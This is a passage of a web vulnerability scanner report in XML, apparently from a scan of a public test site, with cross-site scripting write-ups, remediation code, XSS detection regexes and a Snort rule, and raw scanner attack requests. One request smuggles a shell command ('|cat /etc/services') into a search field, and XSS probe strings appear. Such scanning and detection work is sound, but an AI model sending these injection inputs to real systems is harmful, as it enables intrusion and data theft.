</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="78A4152ED11D0BCB23696D7E2DC168C7"><![CDATA[GET /pictures/7.jpg.tn/%38%32%34%36%37 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="78A4152ED11D0BCB23696D7E2DC168C7";PSID="E7330A41CFCDCC9DCB4118D50B7E9B45";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2538%2532%2534%2536%2537";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="9bb1421f";
X-Request-Memo: ID="ebf14663";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/7.jpg.tn/82467");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:55:54</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="78A4152ED11D0BCB23696D7E2DC168C7"><Method>GET</Method><Path>/pictures/7.jpg.tn/</Path><File>%38%32%34%36%37</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="78A4152ED11D0BCB23696D7E2DC168C7";PSID="E7330A41CFCDCC9DCB4118D50B7E9B45";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2538%2532%2534%2536%2537";AttackStringProps="Attack";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="9bb1421f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ebf14663";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/7.jpg.tn/82467");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:55:54</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="F240660202ECFCDF107178DDFA0BD347"><URL>http://php.vulnweb.com:80/index.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="af6b2405-f179-4b95-9e57-331ed0e0933d"><CheckTypeID>Info</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest><![CDATA[POST /index.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Content-Length: 45
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="F240660202ECFCDF107178DDFA0BD347";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="None";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3525";Engine="Request+Modify";SmartMode="2";tid="55";tt="11";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="69c0a6b6";
X-Request-Memo: ID="f03de475";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

option=search&search=%7Ccat+%2Fetc%2Fservices]]></AttackHTTPRequest><VulnerabilityID>10436</VulnerabilityID><Severity>0</Severity><Name>Flash Object Detected</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Flash Misconfiguration: Source Code Disclosure" href="https://vulncat.fortify.com/">Flash Misconfiguration: Source Code Disclosure</Classification><Classification kind="CWE" identifier="CWE-540" href="https://cwe.mitre.org/data/definitions/540.html">CWE-540: Information Exposure Through Source Code</Classification></Classifications><DetectionSelection><Location offset="3995" length="201" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A Flash movie or Flash object was found. Flash movies and objects can be decompiled and may contain sensitive information. An attacker could decompile the Flash file and gain access to the confidential information, including any hard-coded passwords and keys, within the Flash file.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
The attacker’s goal in re-creating the original source code may include one or more of the following:
<ul><li>To steal a valuable algorithm for use in his own code </li><li>To understand how a security function works to enable him to bypass it </li><li>To extract confidential information, such as hard-coded passwords and keys</li><li>To enable him to alter the code so that it behaves in a malicious way</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
A primary tool in the arsenal of the attacker who wants to get inside your code is the decompiler. A decompiler takes an executable file and attempts to re-create the original source code. It may be almost impossible to go from machine code to a high-level language. It is, however, easy to recover an assembly language version of the program.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />Flare - Flash Decompiler<br /><a href="http://www.nowrap.de/flare.html">http://www.nowrap.de/flare.html</a>]]></SectionText></ReportSection></Issue><Issue id="3d6e6d80-f59c-4bed-8e60-1cf6465b8151"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest><![CDATA[POST /index.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Content-Length: 45
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="F240660202ECFCDF107178DDFA0BD347";PSID="67A382E58832D0E992D8F6EE34F2453D";SessionType="AuditAttack";CrawlType="None";AttackType="None";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3525";Engine="Request+Modify";SmartMode="2";tid="55";tt="11";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="69c0a6b6";
